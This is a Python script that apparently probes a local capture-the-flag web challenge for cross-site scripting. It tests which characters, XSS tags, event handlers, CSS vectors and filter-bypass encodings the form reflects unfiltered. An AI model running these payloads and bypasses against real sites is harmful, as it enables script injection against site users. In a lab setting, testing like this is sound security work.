import requests

base_url = "http://127.0.0.1:33202"

print("="*80)
print("TESTING FILTER - Finding allowed characters and patterns")
print("="*80)

# Test 1: Character by character to see what's filtered
print("\n[*] Test 1: Character whitelist/blacklist")

test_chars = [
    'A', 'a', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=',
    '+', '[', ']', '{', '}', '|', '\\', ':', ';', '"', "'", '<', '>', ',', '.', '?',
    '/', '~', '`', ' '
]

print("Character | Reflected")
print("-" * 30)

allowed_chars = []
for char in test_chars:
    data = {'solution': char}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if char in resp.text:
            print(f"'{char}'       YES")
            allowed_chars.append(char)
        else:
            print(f"'{char}'       NO - FILTERED/BLOCKED")
    except:
        print(f"'{char}'       ERROR")

print(f"\n[*] Allowed characters: {''.join(allowed_chars)}")

# Test 2: Test common XSS patterns
print(f"\n\n[*] Test 2: XSS pattern filtering")

xss_patterns = [
    ('script', '<script>'),
    ('img', '<img src=x>'),
    ('svg', '<svg>'),
    ('iframe', '<iframe>'),
    ('onerror', 'onerror='),
    ('onload', 'onload='),
    ('onfocus', 'onfocus='),
    ('onmouseover', 'onmouseover='),
    ('javascript:', 'javascript:alert(1)'),
    ('javascript uppercase', 'JavaScript:alert(1)'),
    ('javascript mixed', 'JaVaScRiPt:alert(1)'),
    ('data:', 'data:text/html,<script>alert(1)</script>'),
    ('alert', 'alert'),
    ('prompt', 'prompt'),
    ('confirm', 'confirm'),
    ('document', 'document'),
    ('domain', 'domain'),
]

print("\nPattern | Reflected | Result")
print("-" * 50)

for name, pattern in xss_patterns:
    data = {'solution': pattern}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if pattern in resp.text:
            print(f"{name:<20} | YES       | UNFILTERED!")
        elif pattern.lower() in resp.text.lower():
            print(f"{name:<20} | YES       | Case preserved but found")
        elif len(pattern) > 10:
            # Check if partial match
            if pattern[:5] in resp.text:
                print(f"{name:<20} | PARTIAL   | Some characters allowed")
            else:
                print(f"{name:<20} | NO        | FULLY BLOCKED")
        else:
            print(f"{name:<20} | NO        | FULLY BLOCKED")
    except Exception as e:
        print(f"{name:<20} | ERROR     | {str(e)[:30]}")

# Test 3: Test CSS-based XSS (since it's an XSS challenge)
print(f"\n\n[*] Test 3: CSS-based XSS vectors")

css_vectors = [
    ('expression', '<div style="x:expression(alert(1))">'),
    ('background-url', '<div style="background:url(javascript:alert(1))">'),
    ('import', '<style>@import url(javascript:alert(1));</style>'),
    ('IE behavior', '<div style="behavior:url(test.htc)">'),
]

print("\nVector | Reflected")
print("-" * 40)

for name, vector in css_vectors:
    data = {'solution': vector}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if vector in resp.text:
            print(f"{name:<15} | YES - UNFILTERED!")
        else:
            # Check for encoding
            encoded = vector.replace('<', '&lt;').replace('>', '&gt;')
            if encoded in resp.text:
                print(f"{name:<15} | ENCODED (safe)")
            else:
                print(f"{name:<15} | BLOCKED")
    except:
        print(f"{name:<15} | ERROR")

# Test 4: Try bypass techniques
print(f"\n\n[*] Test 4: Filter bypass attempts")

bypass_tests = [
    ('HTML comment', '<!--<script>alert(1)</script>-->'),
    ('Nested tags', '<<script>alert(1)</script>'),
    ('Double encode', '%253Cscript%253Ealert(1)%253C%252Fscript%253E'),
    ('Unicode', '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'),
    ('Hex encode', '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'),
    ('URL encode', '%3Cscript%3Ealert(1)%3C%2Fscript%3E'),
    ('Mixed case', '<ScRiPt>alert(1)</ScRiPt>'),
    ('Split script', '<scr<script>ipt>alert(1)</scr</script>ipt>'),
]

print("\nBypass | Reflected")
print("-" * 45)

for name, test in bypass_tests:
    data = {'solution': test}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if test in resp.text:
            print(f"{name:<20} | YES - UNFILTERED!")
        else:
            print(f"{name:<20} | BLOCKED/ENCODED")
    except:
        print(f"{name:<20} | ERROR")

print(f"\n{'='*80}")
print("Filter analysis complete")
print("="*80)
